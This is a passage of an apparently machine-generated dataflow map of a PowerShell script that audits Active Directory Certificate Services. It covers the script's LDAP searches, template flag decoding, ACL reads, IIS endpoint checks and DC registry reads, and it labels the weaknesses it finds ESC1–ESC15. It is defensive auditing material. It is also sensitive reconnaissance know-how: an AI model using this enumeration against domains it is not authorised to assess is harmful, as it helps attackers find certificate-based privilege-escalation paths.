    "<script>::endpointscope": [
        ("assign Equals", "@()"),
        ("assign PlusEquals", "\"CA host(s) not inspected: $($caHostsElsewhere -join ', ')\""),
        ("assign PlusEquals", '"IIS was read on $localFqdn, which is not a CA host"'),
        (
            "assign PlusEquals",
            "\"more than one CA host matches this host: $($caHostsHere -join ', ')\"",
        ),
        (
            "assign PlusEquals",
            "'the enrollment services were not all read, so the CA hosts are unknown'",
        ),
    ],
    # input of Write-Warning: Write-Warning $endpointsReason
    "<script>::endpointsreason": [
        ("assign Equals", '"IIS enumeration failed: $($_.Exception.Message)"'),
        ("assign Equals", "''"),
    ],
    # condition -not $endpointsSkipped
    "<script>::endpointsskipped": [
        ("assign Equals", "$false"),
        ("assign Equals", "$true"),
    ],
    # input of _searchMarker: _searchMarker ($endpointsComplete -and -not $endpointScope) $endpointsWhy $webEndpoints.Count $webEndpoints.Count $iisFailures
    "<script>::endpointswhy": [
        (
            "assign Equals",
            "(@($endpointsReason) + $endpointScope | Where-Object { $_ }) -join '; '",
        ),
    ],
    # input of _decode: _decode $ef $ENROLL_FLAGS
    "<script>::enroll_flags": [
        (
            "assign Equals",
            "[ordered]@{ 0x00000002 = 'PEND_ALL_REQUESTS' # manager approval 0x00000008 = 'PUBLISH_TO_DS' 0x00000020 = 'AUTO_ENROLLMENT' 0x00000100 = 'USER_INTERACTION_REQUIRED' 0x00080000 = 'NO_SECURITY_EXTENSION' # ESC9 (CT_FLAG_NO_SECURITY_EXTENSION) }",
        ),
    ],
    # condition $ot -eq $ENROLL_GUID
    "<script>::enroll_guid": [
        ("assign Equals", "'0e10c968-78fb-11d2-90d4-00c04f79dc55'"),
    ],
    # input of _markSearch: _markSearch 'enrollment-services' $es @($es.entries).Count $enrollmentServices.Count $esFailures
    "<script>::enrollmentservices": [
        ("assign Equals", "[ordered]@{}"),
        ("index Equals", "$enrollmentServices[$cn] = $published"),
    ],
    # index write $enumeration['web-endpoints']
    "<script>::enumeration": [
        ("assign Equals", "[ordered]@{}"),
        (
            "index Equals",
            "$enumeration['web-endpoints'] = _searchMarker ($endpointsComplete -and -not $endpointScope) $endpointsWhy $webEndpoints.Count $webEndpoints.Count $iisFailures",
        ),
    ],
    # input of _markSearch: _markSearch 'ca-config' $caSearch (@($es.entries).Count + $standalone) $caConfig.Count $esFailures
    "<script>::es": [
        (
            "assign Equals",
            "_search \"CN=Enrollment Services,$pksDn\" '(objectClass=pKIEnrollmentService)' @('cn', 'dnshostname', 'certificatetemplates', 'objectguid')",
        ),
    ],
    # condition $esc10Skipped
    "<script>::esc10skipped": [
        ("assign Equals", "$false"),
        ("assign Equals", "$true"),
        ("assign Equals", "$true"),
    ],
    # condition $esc14Skipped
    "<script>::esc14skipped": [
        ("assign Equals", "$false"),
        ("assign Equals", "$true"),
    ],
    # input of _markSearch: _markSearch 'ca-config' $caSearch (@($es.entries).Count + $standalone) $caConfig.Count $esFailures
    "<script>::esfailures": [
        ("assign Equals", "@()"),
        ("assign PlusEquals", '"enrollment service: $($_.Exception.Message)"'),
    ],
    # input of _markSearch: _markSearch 'pki-acls' $pkiSearch (6 + $caObjects.returned + $esObjects.returned) $pkiAcls.Count (@($caObjects.failures) + @($esObjects.failures))
    "<script>::esobjects": [
        (
            "assign Equals",
            "_childAcls \"CN=Enrollment Services,$pksDn\" '(objectClass=pKIEnrollmentService)' 'ca_object' -CaHost",
        ),
    ],
    # read by a binding of $<script>::oids
    "<script>::gl": [
        (
            "assign Equals",
            "if (@(_v $p 'msds-oidtogrouplink').Count) { [string]@(_v $p 'msds-oidtogrouplink')[0] } else { $null }",
        ),
    ],
    # input of GetDWORDValue: $reg.GetDWORDValue($HKLM, 'SYSTEM\CurrentControlSet\Services\Kdc', 'StrongCertificateBindingEnforcement')
    "<script>::hklm": [
        ("assign Equals", "[uint32]2147483650"),
    ],
    # read by a binding of $<script>::certfile
    "<script>::i": [
        ("assign Equals", "0"),
        ("incdec PostfixPlusPlus", ""),
    ],
    # input of _searchMarker: _searchMarker ($endpointsComplete -and -not $endpointScope) $endpointsWhy $webEndpoints.Count $webEndpoints.Count $iisFailures
    "<script>::iisfailures": [
        ("assign Equals", "@()"),
        ("assign PlusEquals", "\"IIS application under '$($site.Name)' has no readable path\""),
    ],
    # condition $iisHere
    "<script>::iishere": [
        ("assign Equals", "$false"),
        ("assign Equals", "($caHost -and $caHost -eq $localHost)"),
        ("assign Equals", "($dns -and $dns -eq $localFqdn)"),
    ],
    # input of _list: _list $interfaceFlags
    "<script>::interfaceflags": [
        ("assign Equals", "_certutilFlags 'CA\\InterfaceFlags'"),
    ],
    # condition $isLocal
    "<script>::islocal": [
        (
            "assign Equals",
            "($caCommonName -and $cn -ceq $caCommonName -and $caHost -and ($caHost -eq $localHost -or $dns.ToLower() -eq $localFqdn))",
        ),
    ],
    # read by a binding of $<script>::crlfile
    "<script>::j": [
        ("assign Equals", "0"),
        ("incdec PostfixPlusPlus", ""),
    ],
    # input of ConvertFrom-Json: ConvertFrom-Json @' { "crl.tier": { "by": "ingest", "from": ["certs.kind"], "containers": ["certs"], "join": "the CRL's CDP cn = the AIA object's cn", "miss": "null" }, "endpoint.transports": { "by": "collector", "from": ["IIS site bindings"], "containers": ["web-endpoints"], "join": "the application's site", "miss": "null" }, "template.published_by": { "by": "ingest", "from": ["enrollment-services.certificatetemplates"], "containers": ["enrollment-services"], "join": "template cn, exactly ($JOINS publication)", "miss": "unpublished only when enrollment-services is complete", "text": "ESC1-3 and ESC15 publication detail says the list is incomplete when it is" }, "pki.ca_host_sid": { "by": "collector", "from": ["the CA host's computer object objectSid (domain NC)"], "containers": [], "join": "the enrollment service's dNSHostName = the computer object's dNSHostName ($JOINS ca-host)", "miss": "null (not obtained): ESC5 cannot tell the CA host's own grant apart and is undecided" }, "cert.ca_kind": { "by": "ingest", "from": ["ca.kind"], "containers": ["ca-config"], "join": "certs/index.json ca_name = CA name", "miss": "null (unattached certificate)" } } '@
    "<script>::joins": [
        (
            "assign Equals",
            'ConvertFrom-Json @\' { "publication": { "field": "template.published_by", "by": "ingest", "impl": "resolve_join", "from": "enrollment-services.certificatetemplates", "to": "templates", "keys": ["cn"], "legacy_keys": ["cn", "oid"], "compare": "identical (MS-WCCE)", "none": "attaches nowhere (a published template that is not in AD)", "ambiguous": "published_by not obtained for every template it is identical or folds to" }, "cert-ca": { "field": "cert.ca_kind", "by": "ingest", "impl": "resolve_join", "from": "certs.ca_name", "to": "ca-config", "keys": ["cn"], "compare": "identical (both are cn values the collector copied)", "none": "unattached: ca_kind not obtained", "ambiguous": "unattached: ca_kind not obtained (two CA rows folding together is an ingest error)" }, "crl-tier": { "field": "crl.tier", "by": "ingest", "impl": "resolve_join", "from": "crls.ca_name (the CDP object\'s cn)", "to": "certs (certs/index.json ca_name)", "keys": ["ca_name"], "compare": "identical", "none": "tier null", "ambiguous": "tier null (also when one cn\'s certificates disagree on kind)" }, "ca-security": { "field": "ca.security", "by": "ingest", "impl": "exact set", "from": "ca-security.json keys", "to": "ca-config", "keys": ["cn"], "compare": "identical (the collector writes the row\'s name)", "none": "ingest error: an entry naming no CA, or a CA without an entry", "ambiguous": "ingest error: two CA rows whose names fold together" }, "publisher-ca": { "field": "ca.enrollment_service", "by": "ingest", "impl": "exact set", "from": "enrollment-services.json keys", "to": "ca-config", "keys": ["cn"], "compare": "identical (the collector writes the row\'s name)", "none": "ingest error: a publisher without a CA row, or the reverse", "ambiguous": "ingest error: two CA rows whose names fold together" }, "oid-link": { "field": "oid.group_link", "by": "detection (ESC13)", "impl": "resolve_join", "from": "templates.issuance_policy_oids", "to": "oid-objects", "keys": ["oid"], "compare": "identical", "none": "no link: decided only when oid-objects is complete", "ambiguous": "ESC13 undecided (duplicate OIDs also mark oid-objects incomplete)" }, "local-ca": { "field": "ca.edit_flags", "by": "collector", "impl": "-ceq", "from": "enrollment-services.cn", "to": "certutil CA\\\\CommonName", "keys": ["cn"], "compare": "identical (-ceq)", "none": "a remote CA: every registry field null (also for a CA whose AD name is sanitized)", "ambiguous": "ingest error: the local CA\'s standalone row and the enrollment service fold together" }, "ca-host": { "field": "pki.ca_host_sid", "by": "collector", "impl": "-ceq", "from": "enrollment-services dnshostname (the pki-acls row of the enrollment service)", "to": "computer objects in the domain NC", "keys": ["dnshostname"], "compare": "identical (-ceq) on the returned dNSHostName (the LDAP filter only narrows the search)", "none": "ca_host_sid null (not obtained), e.g. the CA host is in another domain", "ambiguous": "ca_host_sid null (not obtained): two computer objects answer, or only one that differs in case" }, "app-site": { "field": "endpoint.transports", "by": "collector", "impl": "parent object", "from": "IIS application", "to": "its IIS site", "keys": ["(parent object)"], "compare": "enumerated under the site", "none": "transports null when the site\'s bindings read nothing", "ambiguous": "impossible: each application is enumerated under one site" } } \'@',
        ),
    ],
    # input of WriteAllText: [IO.File]::WriteAllText($outPath, $script:JS.Serialize($obj), (New-Object Text.UTF8Encoding($false)))
    "<script>::js": [
        ("assign Equals", "New-Object System.Web.Script.Serialization.JavaScriptSerializer"),
        ("member Equals", "$script:JS.MaxJsonLength = [int]::MaxValue"),
    ],
    # input of _wmiDwordStatus: _wmiDwordStatus $kdc
    "<script>::kdc": [
        (
            "assign Equals",
            "$reg.GetDWORDValue($HKLM, 'SYSTEM\\CurrentControlSet\\Services\\Kdc', 'StrongCertificateBindingEnforcement')",
        ),
    ],
    # condition $kind -eq 'other'
    "<script>::kind": [
        ("assign Equals", "$r[1]"),
        ("assign Equals", "_certKindFromDer $der"),
        ("assign Equals", "_classifyApp $appPath"),
    ],
    # input of New-Object: New-Object System.Net.NetworkCredential($LdapUser, $LdapPass)
    "<script>::ldappass": [
        ("assign Equals", "''"),
        ("assign Equals", "_b64 $LdapPassB64"),
    ],
    # input of _b64: _b64 $LdapPassB64
    "<script>::ldappassb64": [
        ("parameter", "[Parameter(ParameterSetName = 'Collect')] [string] $LdapPassB64"),
    ],
    # input of New-Object: New-Object System.Net.NetworkCredential($LdapUser, $LdapPass)
    "<script>::ldapuser": [
        ("assign Equals", "''"),
        ("assign Equals", "_b64 $LdapUserB64"),
    ],
    # input of _b64: _b64 $LdapUserB64
    "<script>::ldapuserb64": [
        ("parameter", "[Parameter(ParameterSetName = 'Collect')] [string] $LdapUserB64"),
    ],
    # input of _localCaRow: _localCaRow $caCommonName $localFqdn '' $false
    "<script>::localfqdn": [
        ("assign Equals", "$localHost"),
        ("assign Equals", "([System.Net.Dns]::GetHostEntry($localHost).HostName).ToLower()"),
    ],
    # argument of .GetHostEntry(): [System.Net.Dns]::GetHostEntry($localHost)
    "<script>::localhost": [
        ("assign Equals", "([string](hostname)).ToLower()"),
    ],
    # receiver of .ContainsKey()
    "<script>::localsecurity": [
        ("assign Equals", "@{}"),
    ],
    # input of _writeJson: _writeJson $manifest 'collector-manifest.json'
    "<script>::manifest": [
        (
            "assign Equals",
            "[ordered]@{ collector_version = $COLLECTOR_VERSION collected_at = (Get-Date).ToUniversalTime().ToString('o') host = [string](hostname) host_fqdn = $localFqdn domain = $rootDse.domain skipped_passes = (@($skippedPasses)) enumeration = $enumeration }",
        ),
    ],
    # input of _decode: _decode $nf $NAME_FLAGS
    "<script>::name_flags": [
        (
            "assign Equals",
            "[ordered]@{ 0x00000001 = 'ENROLLEE_SUPPLIES_SUBJECT' 0x00010000 = 'SUBJECT_ALT_REQUIRE_DOMAIN_DNS' 0x00400000 = 'SUBJECT_ALT_REQUIRE_UPN' 0x00800000 = 'SUBJECT_ALT_REQUIRE_EMAIL' 0x04000000 = 'SUBJECT_ALT_REQUIRE_DNS' 0x08000000 = 'SUBJECT_REQUIRE_DNS_AS_CN' 0x10000000 = 'SUBJECT_REQUIRE_DIRECTORY_PATH' 0x20000000 = 'SUBJECT_REQUIRE_EMAIL' 0x40000000 = 'SUBJECT_REQUIRE_COMMON_NAME' 0x00000008 = 'ENROLLEE_SUPPLIES_SUBJECT_ALT_NAME' }",
        ),
    ],
    # input of _decode: _decode $nf $NAME_FLAGS
    "<script>::nf": [
        (
            "assign Equals",
            "if (@(_v $p 'mspki-certificate-name-flag').Count) { [int]@(_v $p 'mspki-certificate-name-flag')[0] } else { 0 }",
        ),
    ],
    # input of _schemaCheck: _schemaCheck $p $OBJECT_SCHEMA.$container
    "<script>::object_schema": [
        (
            "assign Equals",
            'ConvertFrom-Json @\' { "enrollment-services": { "distinguishedname": {"type": "string", "need": "required", "field": "(identity)"}, "cn": {"type": "string", "need": "required", "field": "name"}, "objectguid": {"type": "guid", "need": "required", "field": "object_guid"}, "dnshostname": {"type": "string", "need": "optional", "field": "dns"}, "certificatetemplates": {"type": "strings", "need": "optional", "field": "(source of template.published_by)"} }, "templates": { "distinguishedname": {"type": "string", "need": "required", "field": "(identity)"}, "cn": {"type": "string", "need": "required", "field": "name"}, "objectguid": {"type": "guid", "need": "required", "field": "object_guid"}, "mspki-cert-template-oid": {"type": "string", "need": "required", "field": "oid"}, "displayname": {"type": "string", "need": "optional", "field": "display_name"}, "mspki-certificate-name-flag": {"type": "int", "need": "optional", "field": "name_flags"}, "mspki-enrollment-flag": {"type": "int", "need": "optional", "field": "enrollment_flags"}, "pkiextendedkeyusage": {"type": "strings", "need": "optional", "field": "ekus"}, "mspki-certificate-policy": {"type": "strings", "need": "optional", "field": "issuance_policy_oids"}, "pkicsp": {"type": "strings", "need": "optional", "field": "csp"}, "mspki-template-schema-version": {"type": "int", "need": "optional", "field": "schema_version"}, "mspki-minimal-key-size": {"type": "int", "need": "optional", "field": "min_key_size"}, "ntsecuritydescriptor": {"type": "bytes", "need": "sd", "field": "security"} }, "oid-objects": { "distinguishedname": {"type": "string", "need": "required", "field": "(identity)"}, "mspki-cert-template-oid": {"type": "string", "need": "required", "field": "oid"}, "objectguid": {"type": "guid", "need": "required", "field": "object_guid"}, "displayname": {"type": "string", "need": "optional", "field": "name"}, "msds-oidtogrouplink": {"type": "string", "need": "optional", "field": "group_link"} }, "pki-acls": { "distinguishedname": {"type": "string", "need": "required", "field": "object_dn"}, "objectguid": {"type": "guid", "need": "required", "field": "object_guid"}, "dnshostname": {"type": "string", "need": "optional", "field": "(source of pki.ca_host_sid)"}, "ntsecuritydescriptor": {"type": "bytes", "need": "sd", "field": "security"} }, "certs": { "distinguishedname": {"type": "string", "need": "required", "field": "(identity)"}, "cn": {"type": "string", "need": "required", "field": "ca_name"}, "cacertificate": {"type": "bytes", "need": "optional", "field": "(certificate)"} }, "crls": { "distinguishedname": {"type": "string", "need": "required", "field": "source"}, "cn": {"type": "string", "need": "required", "field": "ca_name"}, "objectguid": {"type": "guid", "need": "required", "field": "object_guid"}, "certificaterevocationlist": {"type": "bytes", "need": "optional", "field": "(crl)"} }, "principal-mappings": { "distinguishedname": {"type": "string", "need": "required", "field": "dn"}, "objectguid": {"type": "guid", "need": "required", "field": "object_guid"}, "altsecurityidentities": {"type": "strings", "need": "required", "field": "mappings"} }, "dc-config": { "distinguishedname": {"type": "string", "need": "required", "field": "(identity)"}, "objectguid": {"type": "guid", "need": "required", "field": "object_guid"}, "dnshostname": {"type": "string", "need": "placeholder", "field": "name"} } } \'@',
        ),
    ],
    # input of _markSearch: _markSearch 'oid-objects' $os @($os.entries).Count $oids.Count $osFailures
    "<script>::oids": [
        ("assign Equals", "@()"),
        (
            "assign PlusEquals",
            "[ordered]@{ oid = [string]@(_v $p 'mspki-cert-template-oid')[0] object_guid = (_guidHex @(_v $p 'objectguid')) name = [string]@(_v $p 'displayname')[0] group_link = $gl }",
        ),
    ],
    # input of _markSearch: _markSearch 'oid-objects' $os @($os.entries).Count $oids.Count $osFailures
    "<script>::os": [
        (
            "assign Equals",
            "_search \"CN=OID,$pksDn\" '(objectClass=msPKI-Enterprise-Oid)' @('mspki-cert-template-oid', 'objectguid', 'displayname', 'msds-oidtogrouplink')",
        ),
    ],
    # input of _markSearch: _markSearch 'oid-objects' $os @($os.entries).Count $oids.Count $osFailures
    "<script>::osfailures": [
        ("assign Equals", "@()"),
        ("assign PlusEquals", '"OID: $($_.Exception.Message)"'),
    ],
    # input of Join-Path: Join-Path $OutDir $outName
    "<script>::outdir": [
        ("parameter", "[Parameter(Mandatory, ParameterSetName = 'Collect')] [string] $OutDir"),
    ],
    # input of _requireSchema: _requireSchema $p 'enrollment-services'
    "<script>::p": [
        ("assign Equals", "_entryProps $e"),
        ("assign Equals", "_entryProps $e"),
        ("assign Equals", "_entryProps $e"),
        ("assign Equals", "_entryProps $e"),
        ("assign Equals", "_entryProps $e"),
        ("assign Equals", "_entryProps $e"),
        ("assign Equals", "_entryProps $e"),
        ("foreach", "@($pr.value)"),
    ],
    # input of _objAcl: _objAcl $pair[0] $pair[1]
    "<script>::pair": [
        (
            "foreach",
            "@( @($pksDn, 'pks_container'), @(\"CN=NTAuthCertificates,$pksDn\", 'ntauth'), @(\"CN=AIA,$pksDn\", 'aia'), @(\"CN=CDP,$pksDn\", 'cdp'), @(\"CN=Certification Authorities,$pksDn\", 'pks_container'), @(\"CN=Enrollment Services,$pksDn\", 'pks_container'))",
        ),
    ],
    # input of _markSearch: _markSearch 'pki-acls' $pkiSearch (6 + $caObjects.returned + $esObjects.returned) $pkiAcls.Count (@($caObjects.failures) + @($esObjects.failures))
    "<script>::pkiacls": [
        ("assign Equals", "@()"),
        ("assign PlusEquals", "$a"),
        ("assign PlusEquals", "$caObjects.rows"),
        ("assign PlusEquals", "$esObjects.rows"),
        (
            "assign PlusEquals",
            "[ordered]@{ object_dn = $pair[0]; kind = $pair[1]; owner_sid = $null object_guid = '' # the object could not be read at all security = $null; acl_obtained = $false enrollment_service = $false ca_host_sid = '' }",
        ),
    ],
    # input of _markSearch: _markSearch 'pki-acls' $pkiSearch (6 + $caObjects.returned + $esObjects.returned) $pkiAcls.Count (@($caObjects.failures) + @($esObjects.failures))
    "<script>::pkisearch": [
        (
            "assign Equals",
            "@{ complete = ($caObjects.complete -and $esObjects.complete) reason = $(if (-not $caObjects.complete) { $caObjects.reason } else { $esObjects.reason }) }",
        ),
    ],
    # input of _search: _search "CN=Enrollment Services,$pksDn" '(objectClass=pKIEnrollmentService)' @('cn', 'dnshostname', 'certificatetemplates', 'objectguid')
    "<script>::pksdn": [
        ("assign Equals", '"CN=Public Key Services,CN=Services,$($rootDse.config)"'),
    ],
    # condition $pr.ok
    "<script>::pr": [
        (
            "assign Equals",
            '_tryRead { Get-WebConfigurationProperty -PSPath $ps -Filter "$auth/providers" -Name Collection -ErrorAction Stop }',
        ),
    ],
    # input of _markSearch: _markSearch 'principal-mappings' $ps14 @($ps14.entries).Count $principalMappings.Count $psFailures
    "<script>::principalmappings": [
        ("assign Equals", "@()"),
        (
            "assign PlusEquals",
            "[ordered]@{ dn = [string]@(_v $p 'distinguishedname')[0] object_guid = (_guidHex @(_v $p 'objectguid')) mappings = (@(_v $p 'altsecurityidentities' | ForEach-Object { [string]$_ })) }",
        ),
    ],
    # condition $protos -notcontains [string]$b.protocol
    "<script>::protos": [
        ("assign Equals", "@()"),
        ("assign PlusEquals", "[string]$b.protocol"),
    ],
    # input of _list: _list $provs
    "<script>::provs": [
        ("assign Equals", "$null"),
        ("assign Equals", "@()"),
        ("assign PlusEquals", "([string]$p.value).ToLower()"),
    ],
    # input of _tryRead: _tryRead { Get-WebConfigurationProperty -PSPath $ps -Filter $auth -Name enabled -ErrorAction Stop }
    "<script>::ps": [
        ("assign Equals", "\"IIS:\\Sites\\$($site.Name)\\\" + $appPath.TrimStart('/')"),
    ],
    # input of _markSearch: _markSearch 'principal-mappings' $ps14 @($ps14.entries).Count $principalMappings.Count $psFailures
    "<script>::ps14": [
        (
            "assign Equals",
            "_search $domNc '(altSecurityIdentities=*)' @('altsecurityidentities', 'objectguid')",
        ),
    ],
    # input of _markSearch: _markSearch 'principal-mappings' $ps14 @($ps14.entries).Count $principalMappings.Count $psFailures
    "<script>::psfailures": [
        ("assign Equals", "@()"),
        ("assign PlusEquals", '"principal: $($_.Exception.Message)"'),
    ],
    # read by a binding of $<script>::enrollmentservices
    "<script>::published": [
        ("assign Equals", "@(_v $p 'certificatetemplates' | ForEach-Object { [string]$_ })"),
    ],
    # read by a binding of $_entryprops::entry
    "<script>::r": [
        ("foreach", "$rows"),
    ],
    # receiver of .GetDWORDValue()
    "<script>::reg": [
        (
            "assign Equals",
            "Get-WmiObject -ComputerName $dcDns -Credential $dcCred -Namespace 'root\\default' -Class StdRegProv -List",
        ),
        (
            "assign Equals",
            "Get-WmiObject -ComputerName $dcDns -Namespace 'root\\default' -Class StdRegProv -List",
        ),
        ("assign Equals", "Get-WmiObject -Namespace 'root\\default' -Class StdRegProv -List"),
    ],
    # read by a binding of $<script>::manifest
    "<script>::rootdse": [
        ("assign Equals", "_rootDse"),
    ],
    # read by a binding of $<script>::caconfig
    "<script>::row": [
        (
            "assign Equals",
            "[ordered]@{ name = $cn dns = $dns config_string = \"$dns\\$cn\" object_guid = (_guidHex @(_v $p 'objectguid')) enrollment_service = $true # An enterprise CA may be a root or a subordinate: CAType is read from # the CA's own registry, so for a remote CA the kind is not obtained. kind = $null edit_flags = $null interface_flags= $null audit_filter = $null ca_patch_state = 'unknown' disabled_extensions = $null owner_sid = $null registry_config_collected = $false }",
        ),
        ("assign Equals", "_localCaRow $cn $dns (_guidHex @(_v $p 'objectguid')) $true"),
    ],
    # condition $rows
    "<script>::rows": [
        ("assign Equals", "@()"),
        ("assign PlusEquals", ",@($der, $kind)"),
    ],
    # input of _wmiDwordStatus: _wmiDwordStatus $sch
    "<script>::sch": [
        (
            "assign Equals",
            "$reg.GetDWORDValue($HKLM, 'SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL', 'CertificateMappingMethods')",
        ),
    ],
    # input of _decode: _decode ([int]$sch.uValue) $SCHANNEL_BITS
    "<script>::schannel_bits": [
        (
            "assign Equals",
            "[ordered]@{ 1 = 'subject_issuer'; 2 = 'issuer'; 4 = 'upn'; 8 = 's4u2self'; 16 = 's4u2self_explicit' }",
        ),
    ],
    # input of _list: _list $schannelMethods
    "<script>::schannelmethods": [
        ("assign Equals", "$null"),
        ("assign Equals", "@()"),
        ("assign Equals", "_decode ([int]$sch.uValue) $SCHANNEL_BITS"),
    ],
    # read by a binding of $<script>::templates
    "<script>::sec": [
        ("assign Equals", "_sdRead (@(_v $p 'ntsecuritydescriptor')[0])"),
    ],
    # input of Get-WebApplication: Get-WebApplication -Site $site.Name -ErrorAction Stop
    "<script>::site": [
        ("foreach", "(Get-Website -ErrorAction Stop)"),
    ],
    # read by a binding of $<script>::manifest
    "<script>::skippedpasses": [
        ("assign Equals", "@()"),
        ("assign PlusEquals", "'ca-security'"),
        ("assign PlusEquals", "'certs'"),
        ("assign PlusEquals", "'enrollment-endpoints'"),
        ("assign PlusEquals", "'esc10-dc-registry'"),
        ("assign PlusEquals", "'esc14-altsecid'"),
    ],
    # condition $ssl.ok
    "<script>::ssl": [
        (
            "assign Equals",
            "_tryRead { Get-WebConfigurationProperty -PSPath $ps -Filter 'system.webServer/security/access' -Name sslFlags -ErrorAction Stop }",
        ),
    ],
    # input of _markSearch: _markSearch 'ca-config' $caSearch (@($es.entries).Count + $standalone) $caConfig.Count $esFailures
    "<script>::standalone": [
        ("assign Equals", "0"),
        ("assign Equals", "1"),
    ],
    # input of _epaToken: _epaToken $tc.value.Value
    "<script>::tc": [
        (
            "assign Equals",
            "_tryRead { Get-WebConfigurationProperty -PSPath $ps -Filter $auth -Name 'extendedProtection.tokenChecking' -ErrorAction Stop }",
        ),
    ],
    # input of _markSearch: _markSearch 'templates' $ts @($ts.entries).Count $templates.Count $tsFailures
    "<script>::templates": [
        ("assign Equals", "@()"),
        (
            "assign PlusEquals",
            "[ordered]@{ name = [string]@(_v $p 'cn')[0] object_guid = (_guidHex @(_v $p 'objectguid')) display_name = [string]@(_v $p 'displayname')[0] schema_version = if (@(_v $p 'mspki-template-schema-version').Count) { [int]@(_v $p 'mspki-template-schema-version')[0] } else { 1 } oid = [string]@(_v $p 'mspki-cert-template-oid')[0] ekus = (@(_v $p 'pkiextendedkeyusage' | ForEach-Object { [string]$_ })) name_flags = (_decode $nf $NAME_FLAGS) enrollment_flags = (_decode $ef $ENROLL_FLAGS) min_key_size = if (@(_v $p 'mspki-minimal-key-size').Count) { [int]@(_v $p 'mspki-minimal-key-size')[0] } else { $null } issuance_policy_oids = (@(_v $p 'mspki-certificate-policy' | ForEach-Object { [string]$_ })) csp = (($csps -join ', ').ToLower()) security = $sec.aces # template DACL -> ACEs (ESC1/ESC4); null if not obtained acl_obtained = ($null -ne $sec.aces) # SD requested, returned and parsed owner_sid = $sec.owner }",
        ),
    ],
    # read by a binding of $<script>::webendpoints
    "<script>::transports": [
        ("assign Equals", "$null"),
        ("assign Equals", "@($protos)"),
    ],
    # input of _markSearch: _markSearch 'templates' $ts @($ts.entries).Count $templates.Count $tsFailures
    "<script>::ts": [
        (
            "assign Equals",
            "_search \"CN=Certificate Templates,$pksDn\" '(objectClass=pKICertificateTemplate)' @( 'cn', 'displayname', 'objectguid', 'mspki-certificate-name-flag', 'mspki-enrollment-flag', 'pkiextendedkeyusage', 'mspki-certificate-policy', 'pkicsp', 'mspki-template-schema-version', 'mspki-cert-template-oid', 'mspki-minimal-key-size', 'ntsecuritydescriptor') -Sd",
        ),
    ],
    # input of _markSearch: _markSearch 'templates' $ts @($ts.entries).Count $templates.Count $tsFailures
    "<script>::tsfailures": [
        ("assign Equals", "@()"),
        ("assign PlusEquals", '"template: $($_.Exception.Message)"'),
    ],
    # condition $wa.ok
    "<script>::wa": [
        (
            "assign Equals",
            "_tryRead { Get-WebConfigurationProperty -PSPath $ps -Filter $auth -Name enabled -ErrorAction Stop }",
        ),
    ],
    # input of _searchMarker: _searchMarker ($endpointsComplete -and -not $endpointScope) $endpointsWhy $webEndpoints.Count $webEndpoints.Count $iisFailures
    "<script>::webendpoints": [
        ("assign Equals", "@()"),
        (
            "assign PlusEquals",
            "[ordered]@{ kind = $kind name = $appPath host = $localFqdn transports = $transports ssl_required = if ($ssl.ok) { ([string]$ssl.value.Value) -match 'Ssl' } else { $null } windows_auth = if ($wa.ok) { [bool]$wa.value.Value } else { $null } auth_providers = (_list $provs) epa = if ($tc.ok) { _epaToken $tc.value.Value } else { $null } }",
        ),
    ],
    # condition $dcConfigs.Count -gt 0 -and $wmiFailures -eq $dcConfigs.Count
    "<script>::wmifailures": [
        (
            "assign Equals",
            "@($dcConfigs | Where-Object { $null -eq $_.strong_certificate_binding_enforcement }).Count",
        ),
    ],
    # condition $ot -eq $ZERO_GUID
    "<script>::zero_guid": [
        ("assign Equals", "'00000000-0000-0000-0000-000000000000'"),
    ],
    # parameter of _localCaRow, called by a binding of $<script>::caconfig
    "_aclrow::enrollmentservice": [
        ("arg", "$false"),
        ("arg", "([bool]$CaHost)"),
        ("parameter", "[bool]$enrollmentService"),
    ],
    # input of _sdRead: _sdRead (@(_v $p 'ntsecuritydescriptor')[0])
    "_aclrow::p": [
        ("arg", "$p"),
        ("arg", "$p"),
        ("parameter", "$p"),
    ],
    # input of _certutilStatus: _certutilStatus $lines $exitCode
    "_auditfilterfrom::exitcode": [
        ("arg", "$auditRead.code"),
        ("parameter", "$exitCode"),
    ],
    # input of _certutilStatus: _certutilStatus $lines $exitCode
    "_auditfilterfrom::lines": [
        ("arg", "$auditRead.lines"),
        ("parameter", "$lines"),
    ],
    # argument of .GetString(): [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($s))
    "_b64::s": [
        ("arg", "$DcRegistryPassB64"),
        ("arg", "$DcRegistryUserB64"),
        ("arg", "$LdapPassB64"),
        ("arg", "$LdapUserB64"),
        ("parameter", "[string]$s"),
    ],
    # condition $null -eq $resp -or [string]$resp.ResultCode -ne 'Success'
    "_basesearchcore::resp": [
        ("assign Equals", "& $send $null"),
    ],
    # input of $send: & $send $null
    "_basesearchcore::send": [
        ("arg", "$send"),
        ("parameter", "[scriptblock]$send"),
    ],
    # input of _search: _search (_rootDse).domain "(&(objectCategory=computer)(dNSHostName=$(_ldapEscape $dns)))" @('objectsid', 'dnshostname')
    "_cahostsid::dns": [
        ("assign Equals", "[string]@($dnsValues)[0]"),
    ],
    # condition @($dnsValues).Count -ne 1
    "_cahostsid::dnsvalues": [
        ("arg", "@(_v $p 'dnshostname')"),
        ("parameter", "$dnsValues"),
    ],
    # input of _entryProps: _entryProps $e
    "_cahostsid::e": [
        ("foreach", "$r.entries"),
    ],
    # input of _sidString: _sidString @(_v $hits[0] 'objectsid')
    "_cahostsid::hits": [
        ("assign Equals", "@()"),
        ("assign PlusEquals", ",$hp"),
    ],
    # input of _v: _v $hp 'dnshostname'
    "_cahostsid::hp": [
        ("assign Equals", "_entryProps $e"),
    ],
    # condition -not $r.complete -or @($r.entries).Count -ne 1
    "_cahostsid::r": [
        (
            "assign Equals",
            "_search (_rootDse).domain \"(&(objectCategory=computer)(dNSHostName=$(_ldapEscape $dns)))\" @('objectsid', 'dnshostname')",
        ),
    ],
    # condition $null -eq $t
    "_cakindfromtype::t": [
        ("arg", "$caType"),
        ("parameter", "$t"),
    ],
    # condition $a.AceQualifier -eq 'AccessDenied'
    "_casecurityfrombytes::a": [
        ("foreach", "$rsd.DiscretionaryAcl"),
    ],
    # input of New-Object: New-Object Security.AccessControl.RawSecurityDescriptor(@([byte[]]$bytes), 0)
    "_casecurityfrombytes::bytes": [
        ("arg", "$bytes"),
        ("arg", "$r.value"),
        ("parameter", "$bytes"),
    ],
    # condition $m -band 0x1
    "_casecurityfrombytes::m": [
        ("assign Equals", "[int]$a.AccessMask"),
    ],
    # condition $rsd.Owner
    "_casecurityfrombytes::rsd": [
        (
            "assign Equals",
            "New-Object Security.AccessControl.RawSecurityDescriptor(@([byte[]]$bytes), 0)",
        ),
